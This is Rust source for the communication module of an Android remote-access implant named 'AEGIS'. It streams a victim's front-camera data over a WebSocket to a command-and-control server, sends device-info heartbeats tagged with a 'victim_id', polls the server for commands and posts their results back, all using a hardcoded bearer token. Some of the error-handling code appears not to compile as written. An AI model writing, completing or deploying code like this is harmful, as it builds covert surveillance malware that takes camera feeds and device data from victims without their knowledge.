use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::time::Duration;
use once_cell::sync::Lazy;
use tokio_tungstenite::connect_async;
use tokio_tungstenite::tungstenite::Message;
use futures::{SinkExt, StreamExt};
use tokio::sync::mpsc::UnboundedSender;

use std::sync::Mutex;

static WS_STREAM_TX: Lazy<Mutex<Option<UnboundedSender<Vec<u8>>>>> = Lazy::new(|| Mutex::new(None));


static CLIENT: Lazy<Client> = Lazy::new(|| {
    Client::builder()
        .timeout(Duration::from_secs(10))
        .connect_timeout(Duration::from_secs(5))
        .default_headers({
            let mut headers = reqwest::header::HeaderMap::new();
            headers.insert(reqwest::header::AUTHORIZATION, reqwest::header::HeaderValue::from_static("Bearer AEGIS_SECRET_TOKEN_123"));
            headers
        })
        .build()
        .expect("Failed to create HTTP client")
});
pub async fn start_stream_client(c2_url: &str, victim_id: &str) {
    // Construct the WS URL: ws://IP:PORT/stream/front_cam?victim_id=UUID
    // We assume the "active" stream is front_cam by default, but we can multiplex.
    // For simplicity, we connect to a "generic" stream endpoint that the C2 routes.
    let ws_url = format!("{}/ws/stream?victim_id={}", c2_url.replace("http", "ws"), victim_id);
    
    log::info!("[AEGIS] Connecting Stream Client to {}", ws_url);

    match connect_async(ws_url).await {
        Ok((mut ws, _)) => {
            // Create a channel to receive data from Java
            let (tx, mut rx) = tokio::sync::mpsc::unbounded_channel::<Vec<u8>>();
            
            // Register this sender globally so nativeStreamFrame can use it
            *WS_STREAM_TX.lock().unwrap() = Some(tx);

            // Spawn a task to forward data from the channel to the WebSocket
            tokio::spawn(async move {
                while let Some(chunk) = rx.recv().await {
                    let msg = Message::Binary(chunk.into());
                    if ws.send(msg).await.is_err() {
                        log::error!("[AEGIS] Stream Client send failed");
                        break;
                    }
                }
            });

            // Keep the connection open and handle incoming commands (if any)
            while let Some(msg) = ws.next().await {
                if let Ok(msg) = msg {
                    // For now, we just log incoming control messages
                    if msg.is_text() {
                        log::debug!("[AEGIS] Stream Client received: {:?}", msg);
                    }
                } else {
                    break;
                }
            }
            log::warn!("[AEGIS] Stream Client disconnected");
        }
        Err(e) => {
            log::error!("[AEGIS] Stream Client connection failed: {}", e);
        }
    }
}
#[derive(Serialize, Deserialize)]
pub struct SystemInfo {
    pub hostname: String,
    pub os: String,
    pub android_version: String,
    pub model: String,
    pub battery: u8,
}

#[derive(Serialize, Deserialize, Clone)]
pub struct Command {
    pub id: String,
    pub action: String,
    pub args: serde_json::Value,
}

pub async fn send_heartbeat(base_url: &str, victim_id: &str, info: &SystemInfo) -> Result<(), reqwest::Error> {
    let url = format!("{}/api/v1/heartbeat", base_url);
    let payload = serde_json::json!({
        "victim_id": victim_id,
        "info": info
    });
    let resp = CLIENT.post(&url).json(&payload).send().await?;
    if resp.status().is_success() {
        Ok(())
    } else {
        Err(reqwest::Error::from(reqwest::Error::builder().to_string()))
    }
}

pub async fn poll_commands(base_url: &str, victim_id: &str) -> Result<Vec<Command>, reqwest::Error> {
    let url = format!("{}/api/v1/commands?victim_id={}", base_url, victim_id);
    let res = CLIENT.get(&url).send().await?;
    if res.status().is_success() {
        let commands: Vec<Command> = res.json().await?;
        Ok(commands)
    } else {
        Ok(vec![])
    }
}

pub async fn send_response(base_url: &str, victim_id: &str, command_id: &str, success: bool, data: serde_json::Value) -> Result<(), reqwest::Error> {
    let url = format!("{}/api/v1/response", base_url);
    let payload = serde_json::json!({
        "victim_id": victim_id,
        "command_id": command_id,
        "success": success,
        "data": data
    });
    let resp = CLIENT.post(&url).json(&payload).send().await?;
    if resp.status().is_success() {
        Ok(())
    } else {
        Err(reqwest::Error::from(reqwest::Error::builder().to_string()))
    }
}
